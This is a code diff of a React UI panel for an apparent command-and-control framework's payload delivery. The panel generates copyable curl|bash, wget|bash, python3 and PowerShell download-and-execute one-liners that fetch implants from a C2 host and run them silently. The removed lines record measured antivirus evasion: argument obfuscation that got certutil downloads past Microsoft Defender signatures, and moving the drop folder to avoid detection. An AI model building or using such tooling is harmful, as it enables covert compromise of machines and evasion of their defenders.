-                选中监听的类型不用在这儿重复：左边的监听列表每项副标题就写着 reg_name。 */}
-            <div className="hint" style={{ marginTop: 12 }}>
-              {statusText}
-              {loaded ? ' · 已加载' : ''}
-            </div>
-          </div>
-        </div>
-
-        <aside className="gen-side card">
-          <div className="card-hd"><h3>{t('投递入口')}</h3></div>
-          <div className="card-bd" style={{ padding: 14 }}>
-            <div className="gen-summary" style={{ marginBottom: 12 }}>
-              <div><span className="k">Agent</span><b>{agentName}</b></div>
-              <div><span className="k">{t('格式')}</span><b>{format}</b></div>
-              <div><span className="k">{t('架构')}</span><b className="mono">{arch || 'UA auto'}</b></div>
-              <div><span className="k">{t('监听')}</span><b className="mono">{listener || t('未选')}</b></div>
-            </div>
-
-            <div className="hint muted-hint" style={{ marginBottom: 10 }}>
-              {t('Production multi-entry: the server returns the matching OS·arch payload by')} <b>UA / ?d= / ?arch=</b>.
-              beacon 仅 Windows；gopher 按 UA 出 Win/Linux/macOS；linux 仅 ELF。
-            </div>
-
-            {(agentName === 'beacon' || agentName === 'gopher') && (
-              <>
-                <div className="gen-section-title" style={{ marginTop: 4 }}>Windows</div>
-                {winEntries.map((e) => (
-                  <CmdBlock
-                    key={e.id}
-                    label={e.label}
-                    value={entryCommand(e)}
-                    onCopy={() => copy(entryCommand(e), ' ' + e.short)}
-                    warn={e.warn}
-                    axf={axfFor(e)}
-                  />
-                ))}
-                {/* 收益只有这一句是有 A/B 支撑的，就按实测说。PS 那一族本轮两组都没被
-                    检测出来，所以明写「未测出」—— 不写成「都能过」，那是外推。 */}
-                <div className="hint muted-hint" style={{ marginTop: 10 }}>
-                  <b>ArgFuscator</b> rewrites argument syntax — same semantics, different literals.
-                  Measured on the same URL with <code>certutil -urlcache -split -f …</code>: plaintext was
-                  <b> 3/3 </b>blocked by Defender on a cmdline signature (<code>Trojan:Win32/Ceprolad.A</code>,
-                  zero payload bytes delivered), while all 5 obfuscated variants <b>5/5</b> ran;
-                  the curl entry end-to-end delivered a <b>76312B x64 payload</b>.
-                  The obfuscated region covers only the download segment — the output path stays outside; measured <code>%USERPROFILE%</code> expansion 15/15.
-                  Drop location moved from <code>%TEMP%</code> to <code>%USERPROFILE%</code>: measured
-                  <code>%TEMP%</code> × <code>.exe</code> × <code>&amp;&amp; start</code> is the
-                  cmdline-<b>signature</b> <code>Trojan:Win32/Commando.A!ml</code> trigger conjunction
-                  (interleaved A/B: <code>%TEMP%</code> blocked 4/4, <code>%USERPROFILE%</code> 0/4).
-                  ⚠ But the <b>real payload</b> was still flagged 3× under <code>%USERPROFILE%</code> by the same signature,
-                  while a benign stand-in never reproduces it (0 detections in ~30 runs) ⇒ changing the drop location is <b>necessary but not sufficient</b> — not fully fixed.
-                  ⚠ The three PowerShell entries showed no detections in either group this round: benefit <b>unmeasured</b>, not proven.
-                </div>
-              </>
-            )}
-
-            {(agentName === 'linux' || agentName === 'gopher') && (
-              <>
-                <div className="gen-section-title" style={{ marginTop: 14 }}>Linux / macOS / Unix</div>
-                <CmdBlock label="curl | bash（推荐）" value={linuxCmd}
-                  onCopy={() => copy(linuxCmd, ' curl|bash')} />
-                <CmdBlock label="wget | bash" value={linuxWget}
-                  onCopy={() => copy(linuxWget, ' wget|bash')} />
-                <CmdBlock label="curl 直拉二进制" value={linuxCurlDirect}
-                  onCopy={() => copy(linuxCurlDirect, ' curl pull')} />
-                <CmdBlock label="python3 直拉" value={linuxPython}
-                  onCopy={() => copy(linuxPython, ' python3')} />
-              </>
-            )}
-
-            {agentName === 'beacon' && (
-              <div className="hint muted-hint" style={{ marginTop: 12 }}>
-                Current agent = beacon → Windows entries only. Switch to gopher/linux for *nix commands.
-                The server still picks x64/x86 by UA; pin the arch on the left.
-              </div>
-            )}
-
-            <div className="hint" style={{ marginTop: 12 }}>
-              Chain: one-liner → <code>/deliver</code> (script) → <code>/deliver/payload</code> (UA-arch package) → silent exec.
-              {t('Direct-pull entries skip the script layer and hit the payload route. Make sure')} <b>C2 Host</b> {t('and the listener callback are reachable.')}.
-            </div>
-            <button style={{ width: '100%', marginTop: 10 }} onClick={() => { setTab('listeners'); openUiTab('listeners') }}>
-              管理监听器
-            </button>
-            <button style={{ width: '100%', marginTop: 8 }} onClick={() => { setTab('sessions'); openUiTab('sessions') }}>
-              查看主机
-            </button>
+            </section>
           </div>
         </aside>
+
+        <main className="ax-main-col">
+          <div className="ax-main-scroll">
+            <section className="ax-wd-hero">
+              <div className="ax-wd-hero-hd">
+                <div className="ax-wd-hero-title">
+                  <span className={`ax-prompt-badge ${activeHero.promptCls} mono`}>{activeHero.prompt}</span>
+                  <b>{activeHero.title}</b>
+                  {effectiveOs === 'win' && winMethod === 'ps' && (
+                    <div className="ax-seg-track">
+                      <button type="button" className={`ax-seg-btn ${psVariant === 'ps-cmd' ? 'active' : ''}`} onClick={() => setPsVariant('ps-cmd')}>
+                        cmd / 运行
+                      </button>
+                      <button type="button" className={`ax-seg-btn ${psVariant === 'ps-native' ? 'active' : ''}`} onClick={() => setPsVariant('ps-native')}>
+                        PS 内单引号
+                      </button>
+                      <button type="button" className={`ax-seg-btn ${psVariant === 'ps-iwr' ? 'active' : ''}`} onClick={() => setPsVariant('ps-iwr')}>
+                        Invoke-WebRequest
+                      </button>
+                    </div>
+                  )}
+                </div>
+
+                <div className="ax-wd-hero-acts">
+                  {activeHero.axf && (
+                    <button
+                      type="button"
+                      className="ax-btn"
+                      disabled={activeHero.axf.state === 'loading' || activeHero.axf.disabled}
+                      title={activeHero.axf.disabled ? activeHero.axf.disabledReason : '生成语义等价、字面不同的混淆变体'}
+                      onClick={activeHero.axf.onRun}
+                    >
+                      {activeHero.axf.state === 'loading' ? '混淆中…' : t('参数混淆')}
+                    </button>
+                  )}
+                  <button
+                    type="button"
+                    className={`ax-btn-primary compact ${copiedKey === activeHero.id ? 'copied' : ''}`}
+                    onClick={() => copy(activeHero.cmd, activeHero.copySuffix, activeHero.id)}
+                  >
+                    {copiedKey === activeHero.id ? '已复制 ✓' : '复制命令'}
+                  </button>
+                </div>
+              </div>
+
+              <pre className="wd-cmd ax-wd-hero-code mono">{renderHighlightedCmd(activeHero.cmd)}</pre>
+
+              {activeHero.warn && <div className="ax-warn-callout">{activeHero.warn}</div>}
+
+              <div className="ax-wd-hero-eps">
+                <div className="ax-ep-cell">
+                  <span className="ax-ep-lbl">Script 入口</span>
+                  <code className="mono">{scriptUrl || '…'}</code>
+                  <button type="button" className="ax-btn ax-btn-sm" onClick={() => copy(scriptUrl, ' Script URL', 'ep-s')}>
+                    {copiedKey === 'ep-s' ? '已复制 ✓' : '复制'}
+                  </button>
+                </div>
+                <div className="ax-ep-cell">
+                  <span className="ax-ep-lbl payload">Payload 直链</span>
+                  <code className="mono">{payloadUrl || '…'}</code>
+                  <button type="button" className="ax-btn ax-btn-sm" onClick={() => copy(payloadUrl, ' Payload URL', 'ep-p')}>
+                    {copiedKey === 'ep-p' ? '已复制 ✓' : '复制'}
+                  </button>
+                </div>
+              </div>
+
+              {activeHero.axf && <AxfVariantsBox axf={activeHero.axf} />}
+            </section>
+
+            <section className="ax-group-card">
+              <div className="ax-group-card-hd">
+                <b>投递与载荷配置</b>
+                <div className="ax-wd-hero-acts">
+                  <span className="ax-pill mono">{agentName} · {format} · {arch || 'UA auto'}</span>
+                  <button
+                    type="button"
+                    className={`ax-btn-ghost ax-btn-sm ${showTechNotes ? 'active' : ''}`}
+                    onClick={() => setShowTechNotes((v) => !v)}
+                  >
+                    {showTechNotes ? '收起说明' : '投递说明'}
+                  </button>
+                </div>
+              </div>
+
+              {showTechNotes && (
+                <div className="ax-callout" style={{ flexDirection: 'column', alignItems: 'flex-start', gap: 4 }}>
+                  <div>
+                    <b>多平台分发逻辑：</b>服务端依据请求 <code>UA</code>、<code>?d=</code> 或 <code>?arch=</code> 自动编译并返回对应载荷（beacon 仅 Windows · gopher 支持全平台 · linux/macos 按 Native 分发）。
+                  </div>
+                  <div>
+                    <b>ArgFuscator 参数混淆：</b>仅对下载命令主体做语法改写（输出路径保留在 <code>%USERPROFILE%</code> 外层），返回后自动比对 URL 语义一致性并标红异常变体。
+                  </div>
+                </div>
+              )}
+
+              <div className="ax-wd-route-row">
+                <label className="ax-field">
+                  <span className="ax-field-lbl">C2 Host URL（目标机可达地址）</span>
+                  <input
+                    className="mono"
+                    value={c2Host}
+                    onChange={(e) => setC2Host(e.target.value)}
+                    placeholder={t('https://<teamserver 地址>:<端口>/api')}
+                  />
+                </label>
+                <label className="ax-field">
+                  <span className="ax-field-lbl">{t('Script 路由')}</span>
+                  <input className="mono" value={scriptRoute} onChange={(e) => setScriptRoute(e.target.value)} placeholder="/deliver" />
+                </label>
+                <label className="ax-field">
+                  <span className="ax-field-lbl">{t('Payload 路由')}</span>
+                  <input className="mono" value={payloadRoute} onChange={(e) => setPayloadRoute(e.target.value)} placeholder="/deliver/payload" />
+                </label>
+              </div>
+
+              <div className="ax-wd-param-row">
+                <div className="ax-ctrl-grp">
+                  <div className="ax-ctrl-lbl"><span>{t('格式')}</span></div>
+                  <div className="ax-seg-track">
+                    {formats.map((f) => (
+                      <button key={f} type="button" className={`ax-seg-btn ${format === f ? 'active' : ''}`} onClick={() => setFormat(f)}>
+                        {f}
+                      </button>
+                    ))}
+                  </div>
+                </div>
+
+                <div className="ax-ctrl-grp">
+                  <div className="ax-ctrl-lbl"><span>目标架构（留空按 UA）</span></div>
+                  <div className="ax-seg-track">
+                    <button type="button" className={`ax-seg-btn ${!arch ? 'active' : ''}`} onClick={() => setArch('')}>{t('自动')}</button>
+                    {arches.map((a) => (
+                      <button key={a} type="button" className={`ax-seg-btn ${arch === a ? 'active' : ''}`} onClick={() => setArch(a)}>{a}</button>
+                    ))}
+                  </div>
+                </div>
+
+                <label className="ax-ctrl-grp">
+                  <span className="ax-ctrl-lbl">{sleepSpec.kind === 'sleep' ? 'Sleep' : t('重连（秒）')}</span>
+                  <input className="mono ax-wd-sleep-in" value={sleep} onChange={(e) => setSleep(e.target.value)} placeholder={sleepSpec.def} />
+                </label>
+
+                {sleepSpec.kind === 'sleep' && (
+                  <label className="ax-ctrl-grp">
+                    <span className="ax-ctrl-lbl">Jitter</span>
+                    <div className="ax-unit-input ax-wd-num-wrap">
+                      <input
+                        type="number"
+                        className="mono"
+                        min={0}
+                        max={100}
+                        value={jitter}
+                        onChange={(e) => setJitter(Number(e.target.value))}
+                        title={t('抖动%')}
+                      />
+                      <span className="ax-unit">%</span>
+                    </div>
+                  </label>
+                )}
+
+                <label className="ax-ctrl-grp">
+                  <span className="ax-ctrl-lbl">缓存 TTL</span>
+                  <div className="ax-unit-input ax-wd-num-wrap">
+                    <input
+                      type="number"
+                      className="mono"
+                      min={0}
+                      max={1440}
+                      value={cacheTtl}
+                      onChange={(e) => setCacheTtl(Number(e.target.value))}
+                      title="分钟，0=不缓存"
+                    />
+                    <span className="ax-unit">分</span>
+                  </div>
+                </label>
+              </div>
+
+              {agentName === 'beacon' && format === 'Stager' && (
+                <div className="ax-callout">
+                  <span>Stager 模式经 Payload 路由拉取二阶段载荷；日常投递建议优选 Exe。</span>
+                </div>
+              )}
+            </section>
+          </div>
+        </main>
       </div>
+
+      {/* Full-Width 46px Native Qt Dialog Footer (Matches .qt-lst-foot 1:1) */}
+      <footer className="ax-dock">
+        <div className="ax-dock-left">
+          <span className="ax-dock-meta mono">
+            目标机 → {scriptRoute || '/deliver'} → {payloadRoute || '/deliver/payload'}
+          </span>
+          <span className="ax-pill mono">
+            服务端：{serverSnap ? `${serverSnap.listener} · ${serverSnap.agentName} · ${serverSnap.format}` : statusText}
+          </span>
+        </div>
+
+        <div className="ax-dock-right">
+          <button type="button" className="ax-btn" onClick={() => jumpTo('listeners')}>管理监听器</button>
+          <button type="button" className="ax-btn" onClick={() => jumpTo('sessions')}>查看主机</button>
+          <button
+            type="button"
+            className="ax-btn-primary"
+            disabled={busy || !listener}
+            onClick={onApply}
+          >
+            {busy ? '同步中…' : isDirty ? '应用并同步改动' : '应用并同步配置'}
+          </button>
+        </div>
+      </footer>
     </div>
   )
 }
